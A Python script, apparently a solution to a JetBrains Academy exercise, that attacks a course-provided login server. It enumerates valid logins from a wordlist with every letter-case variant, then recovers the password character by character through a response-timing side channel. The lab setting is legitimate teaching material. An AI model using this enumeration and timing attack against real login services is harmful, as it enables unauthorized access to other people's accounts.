# HOST WAS PROVIDED BY JETBRAINS ACADEMY
# There was provided a file containing the most popular logins that had to be used with different
# capitalisation. For passwords however, a simple brute force had to be used. To spot whether details
# we guess are correct, different responses are returned - 'Wrong login!', 'Wrong password!', 'Connection success!'
#
# USAGE (in command-line): python hack.py [hostname] [port]
# Correct login could be spotted simply by the change of response from 'Wrong login!' to 'Wrong password!'
# To spot the right password, there is an exception raised at host's side that causes a delay in sending a response
# if there is a right character(s) on the beginning
#
# AS YOU MAY ALREADY NOTICED, THE FOLLOWING CODE WILL NOT WORK FOR THE CUSTOM HOST.

import argparse, socket, itertools, json
from string import ascii_letters, digits
from datetime import datetime

parser = argparse.ArgumentParser()
parser.add_argument('host', help='enter hostname')
parser.add_argument('port', help='enter port number', type=int)
args = parser.parse_args()


def find_login():
    with open("logins.txt", "r") as file:
        for line in file.readlines():
            yield line.strip("\n")


with socket.socket() as client:
    client.connect((args.host, args.port))
    for login in find_login():
        case = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()]
                                                             for letter in login)))
        for case_login in case:
            # empty password to find login first
            json_login_try = {"login": case_login, "password": ' '}
            client.send(json.dumps(json_login_try, indent=4).encode())
            server_response = json.loads(client.recv(1024).decode())
            if server_response["result"] == 'Wrong password!':
                break
        else:
            continue
        break

    if server_response["result"] == 'Wrong password!':  # then at this stage we know login's correct
        cracked_password = ''  # it will be cracked below
        possible_chars = ascii_letters + digits

        while True:
            for index in range(len(possible_chars)):
                bruteforce_char = possible_chars[index]
                json_password_try = {
                    "login": login,
                    "password": cracked_password + bruteforce_char
                }
                start = datetime.now()
                client.send(json.dumps(json_password_try, indent=4).encode())
                server_response = json.loads(client.recv(1024).decode())
                finish = datetime.now()
                diff = finish - start

                if server_response["result"] == "Connection success!":
                    print(json.dumps(json_password_try, indent=4))
                    exit()
                elif server_response["result"] == "Wrong password!" and diff.microseconds > 90000:
                    cracked_password = cracked_password + bruteforce_char
                else:
                    pass
    else:
        print("I guess we could not find the right login, sorry!")
